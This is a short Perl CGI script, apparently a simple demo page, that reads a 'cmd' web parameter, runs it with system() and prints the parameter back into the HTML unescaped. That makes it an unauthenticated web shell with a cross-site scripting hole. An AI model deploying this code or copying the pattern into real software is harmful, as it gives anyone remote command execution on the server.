#!/usr/bin/perl
use CGI ':standard';
print "Content-type: text/html \n\n";
print "<body bgcolor=lightgrey>";
print "<h3 align='center'>UNIX COMMAND</h3>";
$c=param('cmd');
print "<table border='5px' align='center' style='background-color:pink;'>";
print "<tr><td>COMMAND IS $c</td></tr><tr><td><pre>";
 system($c);
print "</td></tr>";
print "</table>";
print "<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>";
print "<div style='background-color:yellow;'><b><p align='center'>copyright@ </p></div>";
exit(0);
